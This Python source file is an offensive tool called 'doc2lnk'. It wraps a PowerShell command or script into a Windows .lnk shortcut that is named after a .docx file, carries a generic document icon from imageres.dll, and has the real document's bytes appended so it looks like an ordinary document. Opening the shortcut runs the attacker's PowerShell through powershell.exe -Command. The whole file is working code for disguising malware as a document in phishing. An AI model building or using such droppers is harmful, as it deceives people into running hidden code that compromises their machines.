import pylnk3
import argparse
import sys
import os

from . import pylnk3_patch
from . import path_operations

class Document:
    def __init__(self, document_path=None):
        self.document_extensions = ["docx"]
        self.document_path = None
        self.document_content = None

        if type(document_path) == str or type(document_path) == unicode:
            self.document_path = document_path
            try:
                self.document_content = open(self.document_path, 'rb').read()
            except IOError:
                for document_extension in self.document_extensions:
                    extended_path = document_path + "."  + document_extension
                    try:
                        self.document_path = extended_path
                        self.document_content = open(self.document_path, 'rb').read()
                        break
                    except IOError:
                        self.document_path = None
                        continue

                if self.document_path is None:
                    print(f"Error: The document '{document_path}' was not found.")
                    sys.exit(1)

        # Defualts
        self.icon_path = "C:\\Windows\\System32\\imageres.dll" # Contains generic Windows icons
        self.icon_index = 85 # Index within imageres.dll for document icon

def write_lnk_using_document(target, document, arguments=None):
    try:
        lnk_name = os.path.basename(document.document_path) + ".lnk"
        delimiter = b"---LNK_DOCUMENT_BOUNDARY---"

        pylnk3.for_file(
            target_file=target,
            lnk_name=lnk_name,
            arguments=arguments,
            description=None,
            icon_file=document.icon_path,
            icon_index=document.icon_index,
            work_dir=path_operations.get_directory(document.document_path),
            window_mode=None,
        )

    except Exception as e:
        print(f"An error occured while writing .lnk file: {e}")
        return

    with open(lnk_name, "ab") as lnk_handle:
        lnk_handle.write(delimiter)
        lnk_handle.write(document.document_content)

def main():
    program_title = "doc2lnk"
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        prog = program_title,
        usage=(
            f"\t{program_title} <document> <script>\n"
            f"\t{program_title} <document> --string <VALUE>"
        )   
    )

    parser.add_argument(
        'document',
        help='Pass the path of a document file'
    )
    
    parser.add_argument(
        "script",
        nargs="?",
        help="Pass PowerShell script path (required unless --string is provided)"
    )

    parser.add_argument(
        '-s',
        '--string',
        metavar="VALUE",
        help='Pass PowerShell script as a string argument'
    )

    args = parser.parse_args()

    if args.document is None:
        parser.error("You must provide a document path.")

    if args.script is None and args.string is None:
        parser.error("You must provide either a script path or --string VALUE.")

    document = Document(args.document)
    powershell_path = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'

    if args.script is not None:
        try:
            with open(args.script, 'r') as script_handle:
                payload = script_handle.read().replace("\n", ";")
        except FileNotFoundError:
            print(f"Error: The script '{args.script}' was not found.")
            sys.exit(1)
        except Exception as e:
            print(f"An error occurred: {e}")
            sys.exit(1)
    else:
        payload = args.string

    write_lnk_using_document(powershell_path, document, f' -Command {payload}')

if __name__ == "__main__":
    main()